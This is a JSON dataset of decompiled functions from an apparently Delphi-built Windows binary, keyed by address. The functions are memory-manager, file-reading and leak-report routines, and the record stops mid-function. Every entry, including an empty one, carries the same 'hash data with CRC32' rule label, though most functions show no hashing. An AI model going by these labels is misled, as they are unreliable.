{
    "004013bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013bc(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040168c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040168c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x49671c;\n    if (*0x496720 == 0) {\n        return;\n    }\n    if ((*(*0x49671c + -4) & 1) == 0) {\n        *(*0x49671c + -4) = *(*0x49671c + -4) | 8;\n        piVar3 = iVar5 - *0x496720;\n        uVar4 = *0x496720;\n    }\n    else {\n        uVar4 = *(*0x49671c + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.004015ec();\n            uVar4 = *(*0x49671c + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x49671c - *0x496720;\n        uVar4 = uVar4 + *0x496720;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4967ac);\n    *piVar3 = uVar4 + 0x4967a8;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4967ac) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4967a8) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x496728;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x496724 = *0x496724 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 567
    },
    "00401d90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401d90(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t **in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *puVar11;\n    uchar auStack32 [8];\n    uint uStack24;\n    uint8_t **ppuStack20;\n    \n    ppuVar8 = in_EAX[-1];\n    if ((ppuVar8 & 7) != 0) {\n        if ((ppuVar8 & 5) != 0) {\n            if ((ppuVar8 & 3) != 0) {\n                return -1;\n            }\n            ppuVar8 = in_EAX + -4;\n            fcn.00401770();\n            if ((in_EAX[-1] & 8) == 0) {\n                puVar11 = NULL;\n                iVar5 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000, *ppuVar8, in_EAX[-3]);\n                ppuVar6 = ppuVar8;\n                if (iVar5 == 0) {\n                    iVar5 = -1;\n                }\n                else {\n                    iVar5 = 0;\n                }\n            }\n            else {\n                uVar7 = in_EAX[-1] & 0xfffffff0;\n                iVar5 = 0;\n                while( true ) {\n                    sub.kernel32.dll_VirtualQuery(ppuVar8, &stack0xffffffe0);\n                    puVar11 = NULL;\n                    ppuVar6 = ppuVar8;\n                    iVar3 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000);\n                    if (iVar3 == 0) break;\n                    if (uVar7 < 0x1d) goto code_r0x00401897;\n                    uVar7 = uVar7 - 0x1c;\n                    ppuVar8 = ppuVar8 + 7;\n                }\n                iVar5 = -1;\n            }\ncode_r0x00401897:\n            if (iVar5 == 0) {\n                *puVar11 = ppuVar6;\n                ppuVar6[1] = puVar11;\n            }\n            *0x4987a8 = 0;\n            return iVar5;\n        }\n        goto code_r0x00401e91;\n    }\n    puVar9 = *ppuVar8;\n    ppuVar6 = in_EAX;\n    if (*0x49604d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar9;\n            *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n            ppuVar6 = in_EAX;\n            if (uVar1 == 0) break;\n            if (*0x4965b5 == '\\0') {\n                in_EAX = NULL;\n                ppuStack20 = 0x401e2b;\n                ppuVar6 = ppuVar8;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                uVar1 = *puVar9;\n                *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n                ppuVar8 = in_EAX;\n                if (uVar1 == 0) break;\n                ppuStack20 = 0xa;\n                uStack24 = 0x401e45;\n                sub.kernel32.dll_Sleep();\n                ppuVar8 = ppuStack20;\n            }\n        }\n    }\n    in_EAX = ppuVar8;\n    ppuVar8 = in_EAX + 3;\n    *ppuVar8 = *ppuVar8 + -1;\n    puVar4 = in_EAX[2];\n    if (*ppuVar8 != NULL) {\n        in_EAX[2] = ppuVar6;\n        ppuVar6[-1] = puVar4 + 1;\n        if (puVar4 != NULL) {\n            *puVar9 = 0;\n            return 0;\n        }\n        puVar4 = *(puVar9 + 4);\n        in_EAX[5] = puVar9;\n        in_EAX[1] = puVar4;\n        *(puVar4 + 0x14) = in_EAX;\n        *(puVar9 + 4) = in_EAX;\n        *puVar9 = 0;\n        return 0;\n    }\n    if (puVar4 == NULL) {\ncode_r0x00401df7:\n        *(puVar9 + 0xc) = puVar4;\n    }\n    else {\n        puVar4 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar4 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar4;\n        puVar4 = NULL;\n        if (*(puVar9 + 0x10) == in_EAX) goto code_r0x00401df7;\n    }\n    *puVar9 = puVar4;\n    ppuVar8 = in_EAX[-1];\ncode_r0x00401e91:\n    puVar9 = ppuVar8 & 0xfffffff0;\n    if (*0x49604d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar10 = *0x496718 == 0;\n            *0x496718 = *0x496718 ^ bVar10 * (*0x496718 ^ 1);\n            if (bVar10) break;\n            if (*0x4965b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar10 = *0x496718 == 0;\n                *0x496718 = *0x496718 ^ bVar10 * (*0x496718 ^ 1);\n                if (bVar10) break;\n                ppuStack20 = 0x401e83;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if ((*(puVar9 + -4 + in_EAX) & 1) == 0) {\n        *(puVar9 + -4 + in_EAX) = *(puVar9 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar7 = *(puVar9 + -4 + in_EAX) & 0xfffffff0;\n        puVar9 = puVar9 + uVar7;\n        if (0xb2f < uVar7) {\n            fcn.004015ec();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar4 = in_EAX[-2];\n        in_EAX = in_EAX - puVar4;\n        puVar9 = puVar9 + puVar4;\n        if (0xb2f < puVar4) {\n            fcn.004015ec();\n        }\n    }\n    if (puVar9 != 0x13ffe0) {\n        in_EAX[-1] = puVar9 + 3;\n        *(puVar9 + -8 + in_EAX) = puVar9;\n        fcn.0040162c();\n        *0x496718 = 0;\n        return 0;\n    }\n    if (*0x496720 == 0x13ffe0) {\n        ppuStack20 = in_EAX + -4;\n        puVar9 = *ppuStack20;\n        ppuVar8 = in_EAX[-3];\n        *(puVar9 + 4) = ppuVar8;\n        *ppuVar8 = puVar9;\n        *0x496718 = 0;\n        uStack24 = 0x401f3d;\n        iVar5 = sub.kernel32.dll_VirtualFree();\n        return -(iVar5 == 0);\n    }\n    fcn.0040168c();\n    in_EAX[0x4fff7] = 0x2;\n    *0x496718 = 0;\n    *0x49671c = in_EAX + 0x4fff8;\n    *0x496720 = 0x13ffe0;\n    return 0;\n}\n",
        "token_count": 1875
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004024a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004024a4(int32_t lpBuffer)\n\n{\n    uint32_t in_EAX;\n    \n    if ((0xffff < in_EAX) && ((in_EAX & 3) == 0)) {\n        if ((in_EAX < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX + 4)) {\n            *(lpBuffer + -0x10) = 0;\n            sub.kernel32.dll_VirtualQuery();\n        }\n        if ((((3 < *(lpBuffer + -0x10)) && (*(lpBuffer + -0xc) == 0x1000)) && ((*(lpBuffer + -8) & 0xf6) != 0)) &&\n           ((*(lpBuffer + -7) & 1) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 206
    },
    "004026d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026d4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x49204cU >> 5) * 0x800;\n    fcn.00402334();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.0040267c(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.004025a0();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h <= *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 671
    },
    "00402820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402820(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403af4();\n    fcn.00403af4();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x49670c; iVar4 = *0x4987b0,  iVar3 != 0x496708; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.004022f4();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.0040267c();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004026d4(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004022d0();\n        }\n    }\n    while ((iVar4 != 0x4987ac && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.0040267c();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.0040248c();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x49204e;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.0040248c();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402370();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402370();\n                        fcn.0040248c();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else {\n                        fcn.00404530();\n                        puVar5 = fcn.0040248c();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402370();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.0040248c();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402370();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040248c();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1482
    },
    "00403abc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403abc(void)\n\n{\n    char extraout_AH;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) == -0x284f) && (*(in_EAX + 0xc) < *(in_EAX + 0x10))) {\n        if (((*(in_EAX + 6) & 1) == 0) || (*(*(in_EAX + 0xc) + *(in_EAX + 0x14)) != '\\x1a')) {\n            return 0;\n        }\n    }\n    else {\n        fcn.00403bcc();\n        if (extraout_AH != '\\x1a') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 188
    },
    "00403bcc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00403bcc(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 4) != -0x284f) {\n        cVar2 = fcn.00403b90();\n        if (cVar2 == '\\0') goto code_r0x00403c2e;\n    }\n    uVar4 = *(in_EAX + 0xc);\n    if (*(in_EAX + 0x10) <= uVar4) {\n        iVar3 = (**(in_EAX + 0x1c))();\n        if (iVar3 != 0) {\n            fcn.0040307c();\n            goto code_r0x00403c2e;\n        }\n        uVar4 = *(in_EAX + 0xc);\n        if (*(in_EAX + 0x10) <= uVar4) {\n            if ((*(in_EAX + 6) & 1) != 0) {\n                *(uVar4 + *(in_EAX + 0x14)) = 0x1a;\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            }\n            goto code_r0x00403c2e;\n        }\n    }\n    uVar1 = *(uVar4 + *(in_EAX + 0x14));\n    if (((*(in_EAX + 6) & 1) == 0) || (uVar1 != 0x1a)) {\n        *(in_EAX + 0xc) = uVar4 + 1;\n        return uVar1;\n    }\ncode_r0x00403c2e:\n    return CONCAT31(CONCAT21(in_EAX >> 0x10, 0x1a), 0x1a);\n}\n",
        "token_count": 423
    },
    "00403c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403c38(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    int32_t iVar5;\n    \n    iVar7 = param_1;\n    if (((*(in_EAX + 4) == -0x284f) || (cVar2 = fcn.00403b90(),  cVar2 != '\\0')) && (unaff_EBX = in_EAX,  0 < param_1))\n    {\n        puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n        do {\n            while( true ) {\n                iVar4 = iVar5 + -1;\n                if (iVar5 < 1) {\n                    *(in_EAX + 0xc) = puVar6;\n                    uVar3 = fcn.00403bcc(iVar7);\n                    iVar4 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n                    puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n                    if (uVar3 >> 8 != '\\0') {\n                        return in_EAX;\n                    }\n                }\n                else {\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                }\n                cVar2 = uVar3;\n                if (cVar2 == '\\n') goto code_r0x00403c8c;\n                iVar5 = iVar4;\n                if (cVar2 == '\\r') break;\n                if ((cVar2 == '\\x1a') && ((*(in_EAX + 6) & 1) != 0)) goto code_r0x00403c8d;\n                *param_2 = cVar2;\n                iVar4 = param_1 + -1;\n                bVar1 = param_1 < 1;\n                param_1 = iVar4;\n                param_2 = param_2 + 1;\n                if (iVar4 == 0 || bVar1) goto code_r0x00403c8d;\n            }\n        } while (*puVar6 != 10);\ncode_r0x00403c8c:\n        puVar6 = puVar6 + -1;\ncode_r0x00403c8d:\n        *(in_EAX + 0xc) = puVar6 - *(in_EAX + 0x14);\n    }\n    return unaff_EBX;\n}\n",
        "token_count": 619
    },
    "004040ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.004040ac(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uStack12;\n    \n    if ((*(in_EAX + 6) & 1) == 0) {\n        uStack12 = CONCAT31(param_1 >> 8, 10);\n        uVar1 = fcn.00403fdc();\n    }\n    else {\n        uStack12 = param_1 & 0xffff0000 | 0xa0d;\n        uVar1 = fcn.00403fdc();\n    }\n    fcn.0040382c();\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 160
    },
    "0040a8c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.0040a8c4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 246
    },
    "0040ef4c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef4c(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x40f095;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if ((arg_ch & 2) == 0) {\n        fcn.004055c8();\n        fcn.004055c8();\n    }\n    else {\n        puStack48 = &stack0xfffffffc;\n        fcn.00409ab0();\n        fcn.00409ab0();\n    }\n    fcn.004055c8();\n    fcn.00405530();\n    do {\n        if (var_4h == 0) {\ncode_r0x0040f072:\n            *in_FS_OFFSET = puStack56;\n            puStack48 = 0x40f09c;\n            uStack52 = 0x40f087;\n            fcn.00405530();\n            uStack52 = 0x40f094;\n            fcn.00405554();\n            return;\n        }\n        iVar1 = fcn.0040e8d4();\n        if (iVar1 == 0) {\n            fcn.00405818();\n            goto code_r0x0040f072;\n        }\n        fcn.00405a44(&fcn.0040ef4c::var_1ch, *arg_8h);\n        fcn.004058e0(var_14h, var_1ch);\n        fcn.00405a44(&fcn.0040ef4c::var_ch);\n        if ((arg_ch & 1) == 0) {\n            fcn.00405818();\n            goto code_r0x0040f072;\n        }\n        var_18h = var_8h;\n        if (var_8h != 0) {\n            var_18h = *(var_8h + -4);\n        }\n        puStack56 = &fcn.0040ef4c::var_4h;\n        fcn.00405a44();\n    } while( true );\n}\n",
        "token_count": 603
    },
    "0041d348": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d348(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "0041d61c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d61c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41d840;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41d652;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x41d65d;\n    fcn.0041e990();\n    puStack72 = 0x41d668;\n    fcn.0041e990();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41d810;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x41d6a9;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d3c8(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x41d6a0;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d578(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41d7ce;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.0041d268(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.0041d2e0(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.0041d4d8(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404f70();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41d847;\n            uStack76 = 0x41d831;\n            fcn.00405554();\n            uStack76 = 0x41d83f;\n            fcn.00406934();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.0041d2e0(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.0041d2e0(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.0040484c();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0041d22c(&stack0xfffffffc);\n            fcn.0041975c();\n        }\n        else {\n            iVar3 = fcn.00419910();\n            if (iVar3 < 0) {\n                fcn.0041d22c(&stack0xfffffffc);\n                fcn.0041975c();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1029
    },
    "004201c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004201c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.0041999c();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x420220 != (*0x420220 & *(in_EAX + 0x1c)))) {\n            fcn.00420104();\n        }\n        else {\n            fcn.00420190();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "004246e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004247d9)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004246e8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x424904;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x42490b;\n        uStack104 = 0x424903;\n        fcn.00405554();\n        return;\n    }\n    puStack112 = 0x42472c;\n    fcn.004239c8();\n    uStack116 = 0x4248dc;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n        